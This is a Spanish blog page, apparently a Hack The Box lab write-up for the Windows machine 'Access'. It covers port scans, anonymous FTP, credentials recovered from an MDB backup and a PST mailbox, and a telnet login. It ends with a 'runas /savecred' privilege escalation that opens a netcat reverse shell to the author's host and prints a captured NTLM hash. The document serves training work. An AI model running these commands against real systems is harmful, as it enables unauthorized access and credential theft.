@@ -1,0 +1,801 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+  <title>HTB write-up: Access - xbytemx blog</title>
+  <meta name="renderer" content="webkit" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+<meta name="theme-color" content="#f8f5ec" />
+<meta name="msapplication-navbutton-color" content="#f8f5ec">
+<meta name="apple-mobile-web-app-capable" content="yes">
+<meta name="apple-mobile-web-app-status-bar-style" content="#f8f5ec">
+
+
+<meta name="author" content="Tony Palma" />
+  <meta name="description" content="Si tuviera que resumir access en unas pocas frases seria: - Enumera a la organización - Busca en todas las esquinas - Los de ingeniería siempre tienen más permisos
+" />
+
+
+
+
+
+
+
+<meta name="generator" content="Hugo 0.54.0" />
+
+
+<link rel="canonical" href="https://xbytemx.github.io/post/htb_writeup_-_access/" />
+
+<link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
+<link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+<link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
+<link rel="manifest" href="/manifest.json">
+<link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5">
+
+
+
+
+
+
+
+<link href="/dist/even.min.css?v=3.2.0" rel="stylesheet">
+<link href="/lib/fancybox/jquery.fancybox-3.1.20.min.css" rel="stylesheet">
+
+
+
+
+<meta property="og:title" content="HTB write-up: Access" />
+<meta property="og:description" content="Si tuviera que resumir access en unas pocas frases seria:
+- Enumera a la organización
+- Busca en todas las esquinas
+- Los de ingeniería siempre tienen más permisos" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://xbytemx.github.io/post/htb_writeup_-_access/" />
+<meta property="article:published_time" content="2019-03-01T16:50:10-06:00"/>
+<meta property="article:modified_time" content="2019-03-01T16:50:10-06:00"/><meta property="og:site_name" content="xbytemx blog" />
+
+<meta itemprop="name" content="HTB write-up: Access">
+<meta itemprop="description" content="Si tuviera que resumir access en unas pocas frases seria:
+- Enumera a la organización
+- Busca en todas las esquinas
+- Los de ingeniería siempre tienen más permisos">
+
+
+<meta itemprop="datePublished" content="2019-03-01T16:50:10-06:00" />
+<meta itemprop="dateModified" content="2019-03-01T16:50:10-06:00" />
+<meta itemprop="wordCount" content="2361">
+
+
+
+<meta itemprop="keywords" content="hackthebox,htb,passthehash,rce,windows," />
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="HTB write-up: Access"/>
+<meta name="twitter:description" content="Si tuviera que resumir access en unas pocas frases seria:
+- Enumera a la organización
+- Busca en todas las esquinas
+- Los de ingeniería siempre tienen más permisos"/>
+
+<!--[if lte IE 9]>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/classlist/1.1.20170427/classList.min.js"></script>
+<![endif]-->
+
+<!--[if lt IE 9]>
+  <script src="https://cdn.jsdelivr.net/npm/html5shiv@3.7.3/dist/html5shiv.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/respond.js@1.4.2/dest/respond.min.js"></script>
+<![endif]-->
+
+</head>
+<body>
+  <div id="mobile-navbar" class="mobile-navbar">
+  <div class="mobile-header-logo">
+    <a href="/" class="logo">xbytemx blog</a>
+  </div>
+  <div class="mobile-navbar-icon">
+    <span></span>
+    <span></span>
+    <span></span>
+  </div>
+</div>
+<nav id="mobile-menu" class="mobile-menu slideout-menu">
+  <ul class="mobile-menu-list">
+    <a href="/">
+        <li class="mobile-menu-item">Home</li>
+      </a><a href="/post/">
+        <li class="mobile-menu-item">Archives</li>
+      </a><a href="/tags/">
+        <li class="mobile-menu-item">Tags</li>
+      </a><a href="/categories/">
+        <li class="mobile-menu-item">Categories</li>
+      </a>
+  </ul>
+</nav>
+  <div class="container" id="mobile-panel">
+    <header id="header" class="header">
+        <div class="logo-wrapper">
+  <a href="/" class="logo">xbytemx blog</a>
+</div>
+
+<nav class="site-navbar">
+  <ul id="menu" class="menu">
+    <li class="menu-item">
+        <a class="menu-item-link" href="/">Home</a>
+      </li><li class="menu-item">
+        <a class="menu-item-link" href="/post/">Archives</a>
+      </li><li class="menu-item">
+        <a class="menu-item-link" href="/tags/">Tags</a>
+      </li><li class="menu-item">
+        <a class="menu-item-link" href="/categories/">Categories</a>
+      </li>
+  </ul>
+</nav>
+    </header>
+
+    <main id="main" class="main">
+      <div class="content-wrapper">
+        <div id="content" class="content">
+          <article class="post">
+    
+    <header class="post-header">
+      <h1 class="post-title">HTB write-up: Access</h1>
+
+      <div class="post-meta">
+        <span class="post-time"> 2019-03-01 </span>
+        <div class="post-category">
+            
+              <a href="/categories/htb/"> htb </a>
+            
+              <a href="/categories/pentesting/"> pentesting </a>
+            
+          </div>
+        <span class="more-meta"> 2361 palabras </span>
+        <span class="more-meta"> 12 mins lectura </span>
+        
+      </div>
+    </header>
+
+    
+    
+<div class="post-toc" id="post-toc">
+  <h2 class="post-toc-title">Contenidos</h2>
+  
+  <div class="post-toc-content always-active">
+    <nav id="TableOfContents">
+<ul>
+<li><a href="#machine-info">Machine info</a></li>
+<li><a href="#port-scanning">Port Scanning</a></li>
+<li><a href="#services-identification">Services Identification</a></li>
+<li><a href="#gobuster">Gobuster</a></li>
+<li><a href="#get-a-ftp-mirror">Get a FTP Mirror</a></li>
+<li><a href="#mdb-reading">MDB reading</a></li>
+<li><a href="#unzip-access-control-file">Unzip Access Control file</a></li>
+<li><a href="#read-pst-file">Read PST file</a></li>
+<li><a href="#cat-user-txt"><em>cat user.txt</em></a></li>
+<li><a href="#privesc">PrivEsc</a></li>
+<li><a href="#give-me-a-reverse-shell">Give me a reverse shell</a></li>
+<li><a href="#cat-root-txt"><em>cat root.txt</em></a></li>
+</ul>
+</nav>
+  </div>
+</div>
+
+    
+    
+
+    
+    <div class="post-content">
+      <p>Si tuviera que resumir access en unas pocas frases seria:
+- Enumera a la organización
+- Busca en todas las esquinas
+- Los de ingeniería siempre tienen más permisos</p>
+
+<h1 id="machine-info">Machine info</h1>
+
+<p>La información que tenemos de la máquina es:</p>
+
+<table>
+<thead>
+<tr>
+<th>Name</th>
+<th>Maker</th>
+<th>OS</th>
+<th>IP Address</th>
+</tr>
+</thead>
+
+<tbody>
+<tr>
+<td><img src="https://www.hackthebox.eu/storage/avatars/adef7ad3d015a1fbc5235d5a201ca7d1_thumb.png" alt="access image" /> <a href="https://www.hackthebox.eu/home/machines/profile/156">access</a></td>
+<td><a href="https://www.hackthebox.eu/home/users/profile/1190">egre55</a></td>
+<td>Windows</td>
+<td>10.10.10.98</td>
+</tr>
+</tbody>
+</table>
+
+<p>Su tarjeta de presentación es:</p>
+
+<p><img src="/img/htb-access/cardinfo.png" alt="cardinfo" /></p>
+
+<h1 id="port-scanning">Port Scanning</h1>
+
+<p>Iniciamos por ejecutar un <code>nmap</code> y un <code>masscan</code> para identificar puertos udp y tcp abiertos:</p>
+
+<pre><code class="language-text">root@laptop:~# nmap -sS -p- 10.10.10.98 --open -v -n
+Starting Nmap 7.70 ( https://nmap.org ) at 2019-01-03 11:54 CST
+Initiating Ping Scan at 11:54
+Scanning 10.10.10.98 [4 ports]
+Completed Ping Scan at 11:54, 0.43s elapsed (1 total hosts)
+Initiating SYN Stealth Scan at 11:54
+Scanning 10.10.10.98 [65535 ports]
+Discovered open port 21/tcp on 10.10.10.98
+Discovered open port 80/tcp on 10.10.10.98
+Discovered open port 23/tcp on 10.10.10.98
+Completed SYN Stealth Scan at 12:17, 1375.53s elapsed (65535 total ports)
+Nmap scan report for 10.10.10.98
+Host is up (0.20s latency).
+Not shown: 65532 filtered ports
+Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
+PORT   STATE SERVICE
+21/tcp open  ftp
+23/tcp open  telnet
+80/tcp open  http
+
+Read data files from: /usr/bin/../share/nmap
+Nmap done: 1 IP address (1 host up) scanned in 1376.09 seconds
+           Raw packets sent: 131972 (5.807MB) | Rcvd: 993 (58.980KB)
+</code></pre>
+
+<ul>
+<li><code>-sS</code> para escaneo TCP vía SYN</li>
+<li><code>-p-</code> para todos los puertos TCP</li>
+<li><code>--open</code> para que solo me muestre resultados de puertos abiertos</li>
+<li><code>-n</code> para no ejecutar resoluciones</li>
+<li><code>-v</code> para modo <em>verboso</em></li>
+</ul>
+
+<p>Corroboremos con <code>masscan</code>:</p>
+
+<pre><code class="language-text">root@laptop:~# masscan -e tun0 -p0-65535,U:0-65535 --rate 500 10.10.10.98
+
+Starting masscan 1.0.4 (http://bit.ly/14GZzcT) at 2018-12-31 18:50:23 GMT
+ -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth
+Initiating SYN Stealth Scan
+Scanning 1 hosts [131072 ports/host]
+Discovered open port 80/tcp on 10.10.10.98
+Discovered open port 23/tcp on 10.10.10.98
+Discovered open port 21/tcp on 10.10.10.98
+</code></pre>
+
+<ul>
+<li><code>-e tun0</code> para ejecutarlo nada mas en la interface tun0</li>
+<li><code>-p0-65535,U:0-65535</code> TODOS los puertos (TCP y UDP)</li>
+<li><code>--rate 500</code> para mandar 500pps y no sobre cargar la VPN ):</li>
+</ul>
+
+<p>Como podemos ver los puertos son los mismos, por lo que iniciamos por identificar los servicios nuevamente con <code>nmap</code>.</p>
+
+<h1 id="services-identification">Services Identification</h1>
+
+<p>Lanzamos <code>nmap</code> con los parámetros habituales para la identificación (-A):</p>
+
+<pre><code class="language-text">root@laptop:~# nmap -A -T4 -p80,23,21 10.10.10.98 --open -v -n
+Starting Nmap 7.70 ( https://nmap.org ) at 2019-01-03 11:12 CST
+NSE: Loaded 148 scripts for scanning.
+NSE: Script Pre-scanning.
+Initiating NSE at 11:12
+Completed NSE at 11:12, 0.00s elapsed
+Initiating NSE at 11:12
+Completed NSE at 11:12, 0.00s elapsed
+Initiating Ping Scan at 11:12
+Scanning 10.10.10.98 [4 ports]
+Completed Ping Scan at 11:12, 0.43s elapsed (1 total hosts)
+Initiating SYN Stealth Scan at 11:12
+Scanning 10.10.10.98 [3 ports]
+Discovered open port 80/tcp on 10.10.10.98
+Discovered open port 21/tcp on 10.10.10.98
+Discovered open port 23/tcp on 10.10.10.98
+Completed SYN Stealth Scan at 11:12, 0.42s elapsed (3 total ports)
+Initiating Service scan at 11:12
+Scanning 3 services on 10.10.10.98
+Completed Service scan at 11:15, 161.96s elapsed (3 services on 1 host)
+Initiating OS detection (try #1) against 10.10.10.98
+adjust_timeouts2: packet supposedly had rtt of -62414 microseconds.  Ignoring time.
+adjust_timeouts2: packet supposedly had rtt of -62414 microseconds.  Ignoring time.
+Retrying OS detection (try #2) against 10.10.10.98
+Initiating Traceroute at 11:15
+Completed Traceroute at 11:15, 0.20s elapsed
+NSE: Script scanning 10.10.10.98.
+Initiating NSE at 11:15
+NSE: [ftp-bounce] PORT response: 501 Server cannot accept argument.
+Completed NSE at 11:16, 31.40s elapsed
+Initiating NSE at 11:16
+Completed NSE at 11:16, 1.34s elapsed
+Nmap scan report for 10.10.10.98
+Host is up (0.18s latency).
+
+PORT   STATE SERVICE VERSION
+21/tcp open  ftp     Microsoft ftpd
+| ftp-anon: Anonymous FTP login allowed (FTP code 230)
+|_Can't get directory listing: TIMEOUT
+| ftp-syst:
+|_  SYST: Windows_NT
+23/tcp open  telnet?
+80/tcp open  http    Microsoft IIS httpd 7.5
+| http-methods:
+|   Supported Methods: OPTIONS TRACE GET HEAD POST
+|_  Potentially risky methods: TRACE
+|_http-server-header: Microsoft-IIS/7.5
+|_http-title: MegaCorp
+Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+Device type: general purpose|phone|specialized
+Running (JUST GUESSING): Microsoft Windows 8|Phone|2008|7|8.1|Vista|2012 (92%)
+OS CPE: cpe:/o:microsoft:windows_8 cpe:/o:microsoft:windows cpe:/o:microsoft:windows_server_2008:r2 cpe:/o:microsoft:windows_7 cpe:/o:m
+icrosoft:windows_8.1 cpe:/o:microsoft:windows_vista::- cpe:/o:microsoft:windows_vista::sp1 cpe:/o:microsoft:windows_server_2012
+Aggressive OS guesses: Microsoft Windows 8.1 Update 1 (92%), Microsoft Windows Phone 7.5 or 8.0 (92%), Microsoft Windows 7 or Windows S
+erver 2008 R2 (91%), Microsoft Windows Server 2008 R2 (91%), Microsoft Windows Server 2008 R2 or Windows 8.1 (91%), Microsoft Windows S
+erver 2008 R2 SP1 or Windows 8 (91%), Microsoft Windows 7 (91%), Microsoft Windows 7 Professional or Windows 8 (91%), Microsoft Windows
+ 7 SP1 or Windows Server 2008 R2 (91%), Microsoft Windows 7 SP1 or Windows Server 2008 SP2 or 2008 R2 SP1 (91%)
+No exact OS matches for host (test conditions non-ideal).
+Uptime guess: 0.025 days (since Thu Jan  3 10:40:39 2019)
+Network Distance: 2 hops
+TCP Sequence Prediction: Difficulty=260 (Good luck!)
+IP ID Sequence Generation: Incremental
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+
+TRACEROUTE (using port 80/tcp)
+HOP RTT       ADDRESS
+1   185.77 ms 10.10.12.1
+2   188.09 ms 10.10.10.98
+
+NSE: Script Post-scanning.
+Initiating NSE at 11:16
+Completed NSE at 11:16, 0.00s elapsed
+Initiating NSE at 11:16
+Completed NSE at 11:16, 0.00s elapsed
+Read data files from: /usr/bin/../share/nmap
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 204.12 seconds
+           Raw packets sent: 100 (8.298KB) | Rcvd: 48 (3.024KB)
+</code></pre>
+
+<ul>
+<li><code>-A</code>: El parámetro por defecto mas utilizado en <code>nmap</code>, es una abreviación de <code>-sV -sC -O</code></li>
+<li><code>-T4</code>: Equivalente al modo agresivo de tiempos aka <code>--max-rtt-timeout 1250 --initial-rtt-timeout 500 --max-retries 6</code></li>
+<li><code>-p80,23,21</code>: Los puertos a analizar</li>
+<li><code>--open</code>: Solo puertos abiertos, redundante porque ya enumeramos los puertos sorry</li>
+<li><code>-v</code>: Muestrame más</li>
+<li><code>-n</code>: No resuelvas nada nmap!</li>
+</ul>
+
+<p>Tenemos un ftp que permite el ingreso a cualquiera, un telnet medio dummy aka Windows Telnet, un IIS 7.5 de MegaCorp. Comencemos por el servidor HTTP.</p>
+
+<h1 id="gobuster">Gobuster</h1>
+
+<p>Tenia que mencionarlo, le tire un gobuster y no encontré nada relevante para mí D:</p>
+
+<p>Continué con el siguiente servicio.</p>
+
+<h1 id="get-a-ftp-mirror">Get a FTP Mirror</h1>
+
+<p>Para el servicio FTP que tiene acceso anónimo, decidí usar wget mirror, el cual luce de la siguiente manera:</p>
+
+<pre><code class="language-text">xbytemx@laptop:~/htb/access/ftp-anon$ wget --no-passive-ftp -m ftp://anonymous:@10.10.10.98/
+--2019-01-03 11:53:53--  ftp://anonymous:*password*@10.10.10.98/
+           =&gt; “10.10.10.98/.listing”
+Conectando con 10.10.10.98:21... conectado.
+Identificándose como anonymous ... ¡Dentro!
+==&gt; SYST ... hecho.   ==&gt; PWD ... hecho.
+==&gt; TYPE I ... hecho.  ==&gt; no se necesita CWD.
+==&gt; PORT ... hecho.   ==&gt; LIST ... hecho.
+
+10.10.10.98/.listing                  [ &lt;=&gt;                                                         ]      97  --.-KB/s    en 0s
+
+==&gt; PORT ... hecho.   ==&gt; LIST ... hecho.
+
+10.10.10.98/.listing                  [ &lt;=&gt;                                                         ]      97  --.-KB/s    en 0s
+
+2019-01-03 11:53:56 (10.6 MB/s) - “10.10.10.98/.listing” guardado [194]
+
+--2019-01-03 11:53:56--  ftp://anonymous:*password*@10.10.10.98/Backups/
+           =&gt; “10.10.10.98/Backups/.listing”
+==&gt; CWD (1) /Backups ... hecho.
+==&gt; PORT ... hecho.   ==&gt; LIST ... hecho.
+
+10.10.10.98/Backups/.listing          [ &lt;=&gt;                                                         ]      51  --.-KB/s    en 0s
+
+2019-01-03 11:53:57 (2.80 MB/s) - “10.10.10.98/Backups/.listing” guardado [51]
+
+--2019-01-03 11:53:57--  ftp://anonymous:*password*@10.10.10.98/Backups/backup.mdb
+           =&gt; “10.10.10.98/Backups/backup.mdb”
+==&gt; no se requiere CWD.
+==&gt; PORT ... hecho.   ==&gt; RETR backup.mdb ... hecho.
+Longitud: 5652480 (5.4M)
+
+10.10.10.98/Backups/backup.mdb    100%[============================================================&gt;]   5.39M   273KB/s    en 22s
+
+2019-01-03 11:54:20 (248 KB/s) - “10.10.10.98/Backups/backup.mdb” guardado [5652480]
+
+--2019-01-03 11:54:20--  ftp://anonymous:*password*@10.10.10.98/Engineer/
+           =&gt; “10.10.10.98/Engineer/.listing”
+==&gt; CWD (1) /Engineer ... hecho.
+==&gt; PORT ... hecho.   ==&gt; LIST ... hecho.
+
+10.10.10.98/Engineer/.listing         [ &lt;=&gt;                                                         ]      59  --.-KB/s    en 0s
+
+2019-01-03 11:54:20 (3.00 MB/s) - “10.10.10.98/Engineer/.listing” guardado [59]
+
+--2019-01-03 11:54:20--  ftp://anonymous:*password*@10.10.10.98/Engineer/Access%20Control.zip
+           =&gt; “10.10.10.98/Engineer/Access Control.zip”
+==&gt; no se requiere CWD.
+==&gt; PORT ... hecho.   ==&gt; RETR Access Control.zip ... hecho.
+Longitud: 10870 (11K)
+
+10.10.10.98/Engineer/Access Contr 100%[============================================================&gt;]  10.62K  28.8KB/s    en 0.4s
+
+2019-01-03 11:54:22 (28.8 KB/s) - “10.10.10.98/Engineer/Access Control.zip” guardado [10870]
+
+ACABADO --2019-01-03 11:54:22--
+Tiempo total de reloj: 28s
+Descargados: 5 ficheros, 5.4M en 23s (245 KB/s)
+</code></pre>
+
+<p>Parámetros;</p>
+
+<ul>
+<li><code>-m</code>: Modo mirror. Copia todo recursivamente, como lo encuentres</li>
+<li><code>--no-passive-ftp</code>: Elegimos no usar el modo pasivo (cuando el server se conecta al cliente post login)</li>
+<li><code>ftp://anonymous:@10.10.10.98</code>: Básicamente esta sentencia dice, conéctate por FTP, usa el usuario anonymous sin pass a la ip 10.10.10.98</li>
+</ul>
+
+<p>Nos traemos un archivo zip, <code>Access Control.zip</code> y un archivo con extensión <strong>mdb</strong>, <code>backup.mdb</code>.</p>
+
+<p>Analicemos el backup.</p>
+
+<h1 id="mdb-reading">MDB reading</h1>
+
+<p>He de confesar que no conocía este tipo de archivo y que después de googlear un poco acerca de su contenido-formato, encontré la herramienta para explorarlo. Empecé por listar las tablas:</p>
+
+<pre><code class="language-text">xbytemx@laptop:~/htb/access$ mdb-tables ftp-anon/10.10.10.98/Backups/backup.mdb
+acc_antiback acc_door acc_firstopen acc_firstopen_emp acc_holidays acc_interlock acc_levelset acc_levelset_door_group acc_linkageio acc_map acc_mapdoorpos acc_morecardempgroup acc_morecardgroup acc_timeseg acc_wiegandfmt ACGroup acholiday ACTimeZones action_log AlarmLog areaadmin att_attreport att_waitforprocessdata attcalclog attexception AuditedExc auth_group_permissions auth_message auth_permission auth_user auth_user_groups auth_user_user_permissions base_additiondata base_appoption base_basecode base_datatranslation base_operatortemplate base_personaloption base_strresource base_strtranslation base_systemoption CHECKEXACT CHECKINOUT dbbackuplog DEPARTMENTS deptadmin DeptUsedSchs devcmds devcmds_bak django_content_type django_session EmOpLog empitemdefine EXCNOTES FaceTemp iclock_dstime iclock_oplog iclock_testdata iclock_testdata_admin_area iclock_testdata_admin_dept LeaveClass LeaveClass1 Machines NUM_RUN NUM_RUN_DEIL operatecmds personnel_area personnel_cardtype personnel_empchange personnel_leavelog ReportItem SchClass SECURITYDETAILS ServerLog SHIFT TBKEY TBSMSALLOT TBSMSINFO TEMPLATE USER_OF_RUN USER_SPEDAY UserACMachines UserACPrivilege USERINFO userinfo_attarea UsersMachines UserUpdates worktable_groupmsg worktable_instantmsg worktable_msgtype worktable_usrmsg ZKAttendanceMonthStatistics acc_levelset_emp acc_morecardset ACUnlockComb AttParam auth_group AUTHDEVICE base_option dbapp_viewmodel FingerVein devlog HOLIDAYS personnel_issuecard SystemLog USER_TEMP_SCH UserUsedSClasses acc_monitor_log OfflinePermitGroups OfflinePermitUsers OfflinePermitDoors LossCard TmpPermitGroups TmpPermitUsers TmpPermitDoors ParamSet acc_reader acc_auxiliary STD_WiegandFmt CustomReport ReportField BioTemplate FaceTempEx FingerVeinEx TEMPLATEEx
+</code></pre>
+
+<p>Ahora que soy capaz de listar las tablas, se me ocurrió buscar dentro de cada tabla la palabra <strong>password</strong>, para ello realice el siguiente for en bash:</p>
+
+<pre><code class="language-text">xbytemx@laptop:~/htb/access$ for TABLE in $(mdb-tables ftp-anon/10.10.10.98/Backups/backup.mdb); do mdb-export ftp-anon/10.10.10.98/Backups/backup.mdb ${TABLE} | grep password &amp;&amp; printf &quot;La tabla es %s\n&quot; ${TABLE}; done
+id,username,password,Status,last_login,RoleID,Remark
+La tabla es auth_user
+</code></pre>
+
+<p>Hemos encontrado una tabla curiosa, <code>auth_user</code>, exportamos al <em>STDOUT</em> el contenido de la tabla.</p>
+
+<pre><code class="language-text">xbytemx@laptop:~/htb/access$ mdb-export ftp-anon/10.10.10.98/Backups/backup.mdb auth_user
+id,username,password,Status,last_login,RoleID,Remark
+25,&quot;admin&quot;,&quot;admin&quot;,1,&quot;08/23/18 21:11:47&quot;,26,
+27,&quot;engineer&quot;,&quot;access4u@security&quot;,1,&quot;08/23/18 21:13:36&quot;,26,
+28,&quot;backup_admin&quot;,&quot;admin&quot;,1,&quot;08/23/18 21:14:02&quot;,26,
+</code></pre>
+
+<p>Si recordamos hace unos momentos del mirror, teníamos una carpeta llamada Engineer, en donde había un archivo zip. Puede que esta sea su password.</p>
+
+<blockquote>
+<p>Password for engineer is access4u@security</p>
+</blockquote>
+
+<h1 id="unzip-access-control-file">Unzip Access Control file</h1>
+
+<p>Efectivamente, era la contraseña del ZIP. Siempre es bueno intentar todo lo nuevo que aprendamos de la enumeración.</p>
+
+<pre><code class="language-text">xbytemx@laptop:~/htb/access/ftp-anon/10.10.10.98/Engineer$ 7z x Access\ Control.zip
+
+7-Zip [64] 16.02 : Copyright (c) 1999-2016 Igor Pavlov : 2016-05-21
+p7zip Version 16.02 (locale=es_MX.UTF-8,Utf16=on,HugeFiles=on,64 bits,4 CPUs Intel(R) Core(TM) i5-4200U CPU @ 1.60GHz (40651),ASM,AES-N
+I)
+
+Scanning the drive for archives:
+1 file, 10870 bytes (11 KiB)
+
+Extracting archive: Access Control.zip
+--
+Path = Access Control.zip
+Type = zip
+Physical Size = 10870
+
+
+Enter password (will not be echoed):
+Everything is Ok
+
+Size:       271360
+Compressed: 10870
+</code></pre>
+
+<p>Desafortunadamente para la solución, no le estoy pasando como argumento la contraseña, pero les puedo asegurar que esa es la pass.</p>
+
+<h1 id="read-pst-file">Read PST file</h1>
+
+<p>Después de descomprimir el zip, tenemos un archivo con extensión <strong>PST</strong>, que es comúnmente usado por Outlook/Exchange, para almacenar los correos como un archivo, similar a EML. Exploramos este archivo con <code>readpst</code>:</p>
+
+<pre><code class="language-text">xbytemx@laptop:~/htb/access/ftp-anon/10.10.10.98/Engineer$ readpst Access\ Control.pst
+Opening PST file and indexes...
+Processing Folder &quot;Deleted Items&quot;
+        &quot;Access Control&quot; - 2 items done, 0 items skipped.
+</code></pre>
+
+<p>Tenemos un archivo tipo <strong>MBOX</strong> como salida, el cual simplemente pasamos por <code>strings</code>:</p>
+
+<pre><code class="language-text">xbytemx@laptop:~/htb/access/ftp-anon/10.10.10.98/Engineer$ strings Access\ Control.mbox00000001
+From &quot;john@megacorp.com&quot; Thu Aug 23 18:44:07 2018
+Status: RO
+From: john@megacorp.com &lt;john@megacorp.com&gt;
+Subject: MegaCorp Access Control System &quot;security&quot; account
+To: 'security@accesscontrolsystems.com'
+Date: Thu, 23 Aug 2018 23:44:07 +0000
+MIME-Version: 1.0
+Content-Type: multipart/mixed;
+        boundary=&quot;--boundary-LibPST-iamunique-1807661852_-_-&quot;
+----boundary-LibPST-iamunique-1807661852_-_-
+Content-Type: multipart/alternative;
+        boundary=&quot;alt---boundary-LibPST-iamunique-1807661852_-_-&quot;
+--alt---boundary-LibPST-iamunique-1807661852_-_-
+Content-Type: text/plain; charset=&quot;utf-8&quot;
+Hi there,
+The password for the
+security
+ account has been changed to 4Cc3ssC0ntr0ller.  Please ensure this is passed on to your engineers.
+Regards,
+John
+</code></pre>
+
+<p>Corte el contenido posterior para no dejar muy extensa esta parte.</p>
+
+<p>Descubrimos que la password de la cuenta <em>security</em> es <strong>4Cc3ssC0ntr0ller</strong>.</p>
+
+<blockquote>
+<p>Creds for telnet is security / 4Cc3ssC0ntr0ller</p>
+</blockquote>
+
+<h1 id="cat-user-txt"><em>cat user.txt</em></h1>
+
+<p>Usando estas credenciales, ingresemos por telnet:</p>
+
+<pre><code class="language-text">xbytemx@laptop:~/htb/access/ftp-anon/10.10.10.98/Engineer$ telnet 10.10.10.98
+Trying 10.10.10.98...
+Connected to 10.10.10.98.
+Escape character is '^]'.
+Welcome to Microsoft Telnet Service
+
+login: security
+password:
+
+*===============================================================
+Microsoft Telnet Server.
+*===============================================================
+C:\Users\security&gt;cd Desktop
+
+C:\Users\security\Desktop&gt;type user.txt
+</code></pre>
+
+<p>Listo, hemos obtenido la flag de user.</p>
+
+<h1 id="privesc">PrivEsc</h1>
+
+<p>Después de verificar algunos datos sobre la cuenta, enumerar y enumerar un rato, encontré algo curioso con cmdkey:</p>
+
+<pre><code class="language-text">C:\Users\security\Desktop&gt;cmdkey /list
+
+Currently stored credentials:
+
+    Target: Domain:interactive=ACCESS\Administrator
+                                                       Type: Domain Password
+    User: ACCESS\Administrator
+
+    Target: Domain:interactive=administrator@10.10.10.98
+                                                            Type: Domain Password
+    User: administrator@10.10.10.98
+
+    Target: Domain:interactive=access\engineer
+                                                  Type: Domain Password
+    User: access\engineer
+
+
+C:\Users\security\Desktop&gt;
+</code></pre>
+
+<p>Tenemos almacenadas las credenciales de Administrator para el usuario engineer! Gracias <code>/list</code>!</p>
+
+<p>Esto significa que es posible usar las credenciales almacenadas para ejecutar instrucciones en nombre de Administrator.</p>
+
+<p>Por cierto si quieren saber mas sobre cmdkey, les dejo este <a href="https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/cmdkey">link</a>.</p>
+
+<h1 id="give-me-a-reverse-shell">Give me a reverse shell</h1>
+
+<p>En mi caso, me complique un poco de más y realice lo siguiente:</p>
+
+<p>Usar las credenciales de Administrator para ejecutar un cmd.exe que remotamente ejecute un netcat que a su vez llame a un cmd. Esto significa que del lado de mi máquina levanta un smbserver y un listener de netcat.</p>
+
+<pre><code class="language-text">C:\Users\security&gt;runas /savecred /user:ACCESS\Administrator &quot;c:\windows\system32\cmd.exe /c \\10.10.13.32\a\nc.exe -vn 10.10.13.32 3001 -e cmd.exe&quot;
+</code></pre>
+
+<p>Ejecutando runas (la implementación en windows de sudo y doas):
+- <code>/savecred</code>: Usa las credenciales que ya tienes
+- <code>/user:ACCESS\Administrator</code>: El usuario que debe ejecutarlo
+- command:
+    - <code>/c</code>: Lanza el comando como oneshot
+    - <code>\\10.10.13.32\a\nc.exe</code>: La ubicación remota y completa del ejecutable que se lanzará dentro de <code>cmd.exe</code>, en este caso <code>nc.exe</code>
+        - <code>-vn</code>: Muestrame mas información y no me resuelvas nada
+        - <code>10.10.13.32 3001</code>: Te vas a conectar por netcat a esta direccion y puerto
+        - <code>-e cmd.exe</code>: Vas a ejecutar y concatenar este binario despues de conectarte</p>
+
+<p>En el lado de mi máquina el smbserver a la escucha con parámetro <code>a</code> como el smbshare y la carpeta donde tengo netcat for win32.</p>
+
+<pre><code class="language-text">root@laptop:/home/xbytemx/git/impacket/examples# python smbserver.py a /home/xbytemx/tools/netcat-win32-1.11/
+Impacket v0.9.15 - Copyright 2002-2016 Core Security Technologies
+
+[*] Config file parsed
+[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
+[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
+[*] Config file parsed
+[*] Config file parsed
+[*] Config file parsed
+[*] Incoming connection (10.10.10.98,49157)
+[*] AUTHENTICATE_MESSAGE (ACCESS\Administrator,ACCESS)
+[*] User Administrator\ACCESS authenticated successfully
+[*] Administrator::ACCESS:4141414141414141:705304e1f134ba65060d2b39864d93c9:010100000000000000ba7acb86acd401eddc87b6510dd4f900000000010010006b004e00760050004b0062004f0053000200100079005200460049006600520055006b00030010006b004e00760050004b0062004f0053000400100079005200460049006600520055006b000700080000ba7acb86acd40106000400020000000800300030000000000000000000000000300000ce9db888d778a45092ce747ee5d6e3db0ded2df675ab47b104b65825609ca8f00a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310030002e00310033002e0033003200000000000000000000000000
+[*] AUTHENTICATE_MESSAGE (\,ACCESS)
+[*] User \ACCESS authenticated successfully
+[*] :::00::4141414141414141
+[*] Disconnecting Share(1:IPC$)
+[-] Unknown level for query path info! 0x109
+[-] Unknown level for query path info! 0x4
+[-] Unknown level for query path info! 0x109
+[*] Disconnecting Share(2:A)
+</code></pre>
+
+<p>Así es, ya tenia la hash de NTLM de Administrator, unos minutos rompiendo y conseguiría la pass, pero fui terco en concatenar comandos.</p>
+
+<p>El netcat en mi máquina esperando el remote shell de cmd.exe:</p>
+
+<pre><code class="language-text">xbytemx@laptop:~/htb/access$ ncat -vnlp 3001
+Ncat: Version 7.70 ( https://nmap.org/ncat )
+Ncat: Listening on :::3001
+Ncat: Listening on 0.0.0.0:3001
+Ncat: Connection from 10.10.10.98.
+Ncat: Connection from 10.10.10.98:49158.
+Microsoft Windows [Version 6.1.7600]
+Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
+
